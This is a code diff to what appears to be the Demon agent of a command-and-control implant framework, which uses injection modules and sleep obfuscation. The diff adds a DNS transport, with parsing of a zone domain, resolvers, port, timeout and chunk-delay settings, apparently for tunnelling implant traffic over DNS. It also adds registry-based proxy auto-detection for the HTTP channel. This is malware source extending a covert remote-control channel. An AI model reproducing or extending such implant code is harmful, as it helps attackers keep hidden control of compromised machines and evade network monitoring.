@@ -11,6 +11,7 @@
 #include <core/MiniStd.h>
 #include <core/SysNative.h>
 #include <core/Runtime.h>
+#include <core/TransportDns.h>
 
 /* Import Inject Headers */
 #include <inject/Inject.h>
@@ -322,6 +323,9 @@ VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
 #ifdef TRANSPORT_HTTP
             RtWinHttp,
 #endif
+#ifdef TRANSPORT_DNS
+            RtDnsApi,
+#endif
     };
 
     PUTS( "============================================================" )
@@ -539,6 +543,15 @@ VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
             return;
         }
     }
+
+#ifdef TRANSPORT_HTTP
+    /* [HVC-026] Registry proxy detection — runs after RtAdvapi32() has loaded
+     * RegOpenKeyExW / RegQueryValueExW / RegCloseKey. Calling this earlier
+     * crashes because those pointers are NULL until the module-load loop above. */
+    if ( Instance->Config.Transport.Proxy.AutoDetect ) {
+        HttpAutoProxyDetect();
+    }
+#endif
 
     if ( KArgs )
     {
@@ -840,6 +853,10 @@ VOID DemonConfig()
     {
         PUTS( "[CONFIG] [PROXY] Disabled" );
     }
+
+    /* [HVC-026] Auto proxy detection flag — always packed after the manual proxy block */
+    Instance->Config.Transport.Proxy.AutoDetect = (BOOL) ParserGetInt32( &Parser );
+    PRINTF( "[CONFIG] [AUTO PROXY] %s\n", Instance->Config.Transport.Proxy.AutoDetect ? "Enabled" : "Disabled" )
 #endif
 
 #ifdef TRANSPORT_SMB
@@ -861,6 +878,34 @@ VOID DemonConfig()
     }
     Instance->Config.Transport.WorkingHours = ParserGetInt32( &Parser );
 #endif
+
+#ifdef TRANSPORT_DNS
+    {
+        DWORD i;
+        Buffer = ParserGetBytes( &Parser, &Length );
+        Instance->Config.Transport.DnsCtx.ZoneDomain = Instance->Win32.LocalAlloc( LPTR, Length + sizeof( WCHAR ) );
+        MemCopy( Instance->Config.Transport.DnsCtx.ZoneDomain, Buffer, Length );
+        PRINTF( "[CONFIG] DNS ZoneDomain: %ls\n", Instance->Config.Transport.DnsCtx.ZoneDomain )
+
+        Instance->Config.Transport.DnsCtx.ResolverCount = (DWORD)ParserGetInt32( &Parser );
+        for ( i = 0; i < Instance->Config.Transport.DnsCtx.ResolverCount && i < 8; i++ )
+        {
+            Buffer = ParserGetBytes( &Parser, &Length );
+            Instance->Config.Transport.DnsCtx.Resolvers[ i ] = Instance->Win32.LocalAlloc( LPTR, Length + sizeof( WCHAR ) );
+            MemCopy( Instance->Config.Transport.DnsCtx.Resolvers[ i ], Buffer, Length );
+        }
+
+        Instance->Config.Transport.DnsCtx.Port         = (WORD)ParserGetInt32( &Parser );
+        Instance->Config.Transport.DnsCtx.QueryTimeout = (DWORD)ParserGetInt32( &Parser );
+        Instance->Config.Transport.DnsCtx.ChunkDelayMs = (DWORD)ParserGetInt32( &Parser );
+        Instance->Config.Transport.DnsCtx.SeqNum       = DNS_SEQ_INIT;
+
+        PRINTF( "[CONFIG] DNS Port=%d Timeout=%d ChunkDelay=%d\n",
+            (int)Instance->Config.Transport.DnsCtx.Port,
+            (int)Instance->Config.Transport.DnsCtx.QueryTimeout,
+            (int)Instance->Config.Transport.DnsCtx.ChunkDelayMs )
+    }
+#endif /* TRANSPORT_DNS */
 
     /* Start address for the Foliage sleep-obfuscation APC thread.
      *
